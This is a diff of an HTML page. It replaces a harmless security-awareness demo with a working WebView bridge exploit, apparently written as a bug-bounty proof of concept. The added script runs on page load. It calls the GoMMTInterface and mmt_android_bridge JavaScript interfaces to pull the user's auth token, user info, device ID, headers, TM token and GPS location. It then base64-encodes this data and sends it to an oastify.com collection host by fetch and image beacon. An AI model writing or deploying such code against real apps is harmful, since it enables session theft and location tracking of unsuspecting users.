@@ -1,79 +1,58 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Security Awareness Demo</title>
-
-<style>
-body {
-    margin: 0;
-    font-family: Arial, sans-serif;
-    background: #111;
-    color: white;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-    text-align: center;
-}
-
-.box {
-    background: #222;
-    padding: 30px;
-    border-radius: 10px;
-    width: 400px;
-    box-shadow: 0 0 25px rgba(255,0,0,0.6);
-}
-
-h2 {
-    color: #ff4d4d;
-}
-
-button {
-    margin-top: 15px;
-    padding: 10px 15px;
-    border: none;
-    border-radius: 5px;
-    background: #007bff;
-    color: white;
-    cursor: pointer;
-}
-</style>
+    <title>Security Research - Impact Assessment</title>
 </head>
 <body>
+    <div id="status">Initializing...</div>
 
-<div class="box">
-    <h2>⚠ You Clicked a Suspicious Link</h2>
-    <p id="message">Simulating what a malicious site might attempt...</p>
-    <button onclick="resetDemo()">Reset Demo</button>
-</div>
+    <script>
+        const gate = "https://367gdv1fg2qr6doc6l3npxt0vr1ipcd1.oastify.com";
 
-<script>
-window.onload = function() {
-    const message = document.getElementById("message");
+        async function exfiltrate() {
+            let loot = {};
 
-    setTimeout(() => {
-        message.innerHTML = "🔍 Attempting to access browser data...";
-    }, 1500);
+            // --- PHASE 1: GoMMTInterface Extraction ---
+            if (typeof GoMMTInterface !== 'undefined') {
+                try {
+                    loot.auth = GoMMTInterface.getUserAuth() || "empty";
+                    loot.info = GoMMTInterface.getUserInfo() || "empty";
+                    loot.devId = GoMMTInterface.getDeviceId() || "empty";
+                    loot.headers = GoMMTInterface.getHeaders() || "empty";
+                    loot.status = GoMMTInterface.getUserLoginStatus() || "unknown";
+                } catch (e) { loot.err_gommt = e.message; }
+            }
 
-    setTimeout(() => {
-        message.innerHTML = "📡 Attempting to send data to remote server...";
-    }, 3000);
+            // --- PHASE 2: mmt_android_bridge Extraction ---
+            if (typeof mmt_android_bridge !== 'undefined') {
+                try {
+                    loot.tmToken = mmt_android_bridge.getTMToken() || "empty";
+                    loot.refCode = mmt_android_bridge.getInAppStorage("referrerCode") || "none";
 
-    setTimeout(() => {
-        message.innerHTML = "🔄 Attempting forced redirect...";
-    }, 4500);
+                    // Trigger Location (requires callback)
+                    mmt_android_bridge.fetchLocation("handleLoc", true);
+                } catch (e) { loot.err_mmt = e.message; }
+            }
 
-    setTimeout(() => {
-        message.innerHTML = "✅ This was a SAFE cybersecurity awareness simulation.<br><br>JavaScript can run automatically when visiting a website. Always verify links before clicking.";
-    }, 6000);
-};
+            // --- PHASE 3: Transmission ---
+            const report = btoa(JSON.stringify(loot)); // Base64 encode the payload
 
-function resetDemo() {
-    location.reload();
-}
-</script>
+            // Primary: Fetch (Modern)
+            fetch(`${gate}/dump?data=${report}`).catch(() => {
+                // Fallback: Image Beacon (Legacy/Strict)
+                new Image().src = `${gate}/log?d=${report}`;
+            });
 
+            document.getElementById('status').innerHTML = "Assessment Complete.";
+        }
+
+        // Global callback for location tracking
+        window.handleLoc = function(data) {
+            new Image().src = `${gate}/gps?coord=` + encodeURIComponent(JSON.stringify(data));
+        };
+
+        // Execute with a slight delay to ensure bridge injection
+        window.onload = () => { setTimeout(exfiltrate, 800); };
+    </script>
 </body>
 </html>
